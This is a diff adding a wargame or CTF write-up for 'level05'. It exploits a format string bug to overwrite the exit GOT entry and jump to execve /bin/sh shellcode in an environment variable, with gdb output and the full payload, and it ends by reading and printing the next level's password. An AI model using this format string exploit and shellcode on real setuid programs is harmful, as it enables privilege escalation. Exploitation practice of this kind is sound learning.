@@ -1,0 +1,78 @@
+
+The program is vulnarable for format string attack. This attack (%n option in particular) be used to rewrite exit.
+
+---> x exit
+    0x8048370 <exit@plt>:   0x97e025ff
+
+---> disassemble 0x8048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:     jmp    *0x80497e0
+   0x08048376 <+6>:     push   $0x18
+   0x0804837b <+11>:    jmp    0x8048330
+End of assembler dump.
+
+Let's check that 0x80497e0 is correct address
+---> x 0x80497e0
+    0x80497e0 <exit@got.plt>:       0x08048376
+
+$ python
+Python 2.7.3 (default, Jun 22 2015, 19:33:41) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import struct 
+>>> struct.pack("<I", 0x80497e0)
+'\xe0\x97\x04\x08'
+
+Now we need to know input's position and what to write in that addres. For that purpose shellcode from https://shell-storm.org/shellcode/index.html will be used (for intel x86).
+Becuase :
+
+$file level05
+level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
+
+$ (python -c "print '%x ' * 21";cat) | ./level05
+64 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 0 ffffffff ffffd754 f7fdb000 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
+
+10th position
+
+$ export PAYLOAD=$( python -c "print '\x90' * 1100 + '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")
+
+---> start
+Temporary breakpoint 1 at 0x8048449
+Starting program: /home/users/level05/level05 
+
+Temporary breakpoint 1, 0x08048449 in main ()
+---> x/500s env
+No symbol table is loaded.  Use the "file" command.
+---> x/1000s environ
+    ...
+    0xffffdf73:      "LESSOPEN=| /usr/bin/lesspipe %s"
+    0xffffdb4c:      "PAYLOAD=\220\220"...
+    0xffffdc14:      "\220\220"...
+    0xffffdcdc:      "\220\220"...
+    0xffffdda4:      "\220\220"...
+    0xffffde6c:      "\220\220"...
+    0xffffdf34:      "\220\220\220\220\220\220\220\220\353\v[1\300\061\311\061Ұ\v̀\350\360\377\377\377/bin/sh"
+    0xffffdfba:      "LESSCLOSE=/usr/bin/lesspipe %s %s"
+    ...
+
+0xffffdcdc is too long so ffff and dcdc wil be passed separatly to 0x80497e0 and 0x80497e2 relatevly
+
+0xdcdc - 0x8 = 56532 
+0xffff - 0xdcdc = 0x2323 = 8995
+
+$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56532d" + "%10$hn" + "%8995d" + "%11$hn"';cat) |  ./level05
+
+whoami
+level06
+cat /home/users/level06/.pass                    
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+$ su level06
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level06/level06
+
+0xffffdf94
+0xffffdfa0
+57244
+8283
